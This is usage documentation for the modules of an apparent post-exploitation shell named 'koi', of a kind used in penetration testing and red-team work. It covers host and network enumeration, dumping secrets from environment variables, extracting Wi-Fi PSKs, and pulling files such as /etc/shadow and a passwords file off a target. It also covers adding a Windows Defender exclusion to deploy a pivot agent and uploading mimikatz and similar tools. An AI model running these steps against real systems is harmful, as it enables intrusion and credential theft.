# Built-in Modules

## Running a module

```
koi ❯ run <module> <id> [args…]
```

Modules are only offered for sessions whose OS matches the module's declared `platform`. If the OS doesn't match, the run is rejected with an error.

Type `modules` (or `mdls`) to list everything currently loaded:

```
koi ❯ modules
```

If you add or edit a module file on disk, reload without restarting:

```
koi ❯ reload
```

---

## Enumeration

### `sysinfo`

**Platform:** Linux  
**Usage:** `run sysinfo <id>`

Gathers basic system information from the target in a single box: hostname, OS, kernel, architecture, uptime, CPU, RAM, disk usage, logged-in users, current user, shell, and IP address.

```
koi ❯ run sysinfo 1
```

---

### `get_users`

**Platform:** Linux  
**Usage:** `run get_users <id> [-a]`

Reads `/etc/passwd` and lists users. By default, only users with an interactive shell (`/bin/bash`, `/bin/sh`, `/bin/zsh`, `/bin/dash`) are shown.

| Flag | Description |
|---|---|
| `-a`, `--all` | Show all users, not just those with a login shell |

```
koi ❯ run get_users 1
koi ❯ run get_users 1 -a
```

---

### `get_processes`

**Platform:** Linux, Windows PowerShell  
**Usage:** `run get_processes <id> [-a] [-f KEYWORD]`

Lists running processes and highlights interesting ones. On Linux, flags: processes running from `/tmp`, network tools (`nc`, `socat`, `nmap`), interpreters with arguments, privilege helpers (`sudo`, `cron`), and root-owned services. On Windows, flags LOLBins and processes owned by non-system accounts.

| Flag | Description |
|---|---|
| `-a`, `--all` | Show all processes instead of only interesting ones |
| `-f KEYWORD`, `--filter KEYWORD` | Filter by name, user, or path keyword |

```
koi ❯ run get_processes 1
koi ❯ run get_processes 1 -f apache
koi ❯ run get_processes 2 -a
```

---

### `env_dump`

**Platform:** Linux, Windows PowerShell  
**Usage:** `run env_dump <id> [-a]`

Dumps environment variables and automatically highlights credentials, tokens, and keys based on variable name patterns (`pass`, `token`, `api`, `secret`, `aws`, …) and value patterns (JWT, GitHub PAT, AWS keys, DB connection strings, …).

| Flag | Description |
|---|---|
| `-a`, `--all` | Show all variables, not just sensitive ones |

```
koi ❯ run env_dump 1
koi ❯ run env_dump 2 -a
```

---

### `network_enum`

**Platform:** Linux  
**Usage:** `run network_enum <id> [--no-scan] [-s CIDR] [-t N]`

Enumerates network interfaces, routing table, ARP neighbors, listening ports, established connections, and DNS configuration. Optionally performs a ping sweep on each detected subnet to discover live hosts.

| Flag | Description |
|---|---|
| `--no-scan` | Skip live host discovery |
| `-s CIDR`, `--subnet CIDR` | Override the target subnet (e.g. `10.10.0.0/24`) |
| `-t N`, `--timeout N` | Ping timeout per host in seconds (default: 1) |

!!! warning
    Subnets larger than `/21` (2048 hosts) are skipped automatically. Use `-s` to narrow the target range.

```
koi ❯ run network_enum 1
koi ❯ run network_enum 1 --no-scan
koi ❯ run network_enum 1 -s 172.16.10.0/24 -t 2
```

---

### `wifi_enum`

**Platform:** Linux  
**Usage:** `run wifi_enum <id>`

Enumerates nearby Wi-Fi networks via `nmcli` and extracts PSK credentials from `/etc/wpa_supplicant/wpa_supplicant.conf` if readable.

```
koi ❯ run wifi_enum 1
```

---

### `sharphound`

**Platform:** Windows PowerShell  
**Usage:** `run sharphound <id> [-c COLLECTION] [-o LOCAL_ZIP]`

Fetches the latest [SharpHound](https://github.com/SpecterOps/SharpHound) release from GitHub, uploads it to the target, runs it, and retrieves the BloodHound zip locally. The remote workspace (`sh_<token>`) is created in the current working directory of the remote shell and cleaned up automatically on completion.

| Flag | Description |
|---|---|
| `-c COLLECTION`, `--collection COLLECTION` | SharpHound collection method (default: `Default`) |
| `-o PATH`, `--output PATH` | Local path for the output zip |

!!! note
    The session does not need to be upgraded. The module works on plain PowerShell sessions.

```
koi ❯ run sharphound 2
koi ❯ run sharphound 2 -c All -o bh_corp.zip
```

---

## File Transfer

### `download`

**Platform:** Linux, Windows PowerShell  
**Usage:** `run download <id> <remote_path> [-o LOCAL_PATH]`

Downloads a file from the target via a dedicated TCP connection. Shows a progress bar during transfer. The remote path can contain spaces (pass without quotes).

| Flag | Description |
|---|---|
| `-o PATH`, `--output PATH` | Local destination path (default: filename from remote path) |

```
koi ❯ run download 1 /etc/shadow
koi ❯ run download 1 /home/user/documents/report.pdf -o report.pdf
koi ❯ run download 2 "C:\Users\admin\Desktop\passwords.txt" -o passwords.txt
```

---

### `upload`

**Platform:** Linux, Windows PowerShell  
**Usage:** `run upload <id> <local_path> [-o REMOTE_PATH]`

Uploads a local file to the target via a dedicated TCP connection. Shows a progress bar during transfer. If no `-o` path is given, the file is placed in the **current working directory of the remote shell** (i.e. wherever the shell is when you run the module).

| Flag | Description |
|---|---|
| `-o PATH`, `--output PATH` | Remote destination path |

```
koi ❯ run upload 1 /opt/tools/linpeas.sh
koi ❯ run upload 1 /opt/tools/linpeas.sh -o /tmp/lp.sh
koi ❯ run upload 2 /opt/tools/chisel.exe -o "C:\Temp\chisel.exe"
```

---

## Pivoting

### `ligolo`

**Platform:** Linux, Windows PowerShell  
**Usage:** `run ligolo <id> [-o REMOTE_PATH]`

Fetches the latest [ligolo-ng](https://github.com/nicocha30/ligolo-ng) agent release from GitHub for the target's architecture, and uploads it to the target. On Windows, adds a Defender exclusion for the destination directory before uploading.

Architecture is detected automatically (`uname -m` on Linux, `$env:PROCESSOR_ARCHITECTURE` on Windows). The agent is deployed in the current working directory of the remote shell (`./agent` on Linux, `.\agent.exe` on Windows) unless `-o` is specified.

| Flag | Description |
|---|---|
| `-o PATH`, `--output PATH` | Remote destination path for the agent binary |

```
koi ❯ run ligolo 1
koi ❯ run ligolo 1 -o /opt/agent
koi ❯ run ligolo 2 -o "C:\Temp\agent.exe"
```

---

## Other

### `populate_win`

**Platform:** Windows PowerShell  
**Usage:** `run populate_win <id> [-o REMOTE_DIR]`

Downloads and uploads a collection of common exploitation tools to the target: Rubeus, RunasCs, Certify, winPEAS, and mimikatz. Binaries are pulled from [SharpCollection](https://github.com/Flangvik/SharpCollection) and the official mimikatz release.

| Flag | Description |
|---|---|
| `-o DIR`, `--output-dir DIR` | Remote directory (default: current working directory of the remote shell) |

```
koi ❯ run populate_win 2
koi ❯ run populate_win 2 -o "C:\Temp\tools"
```
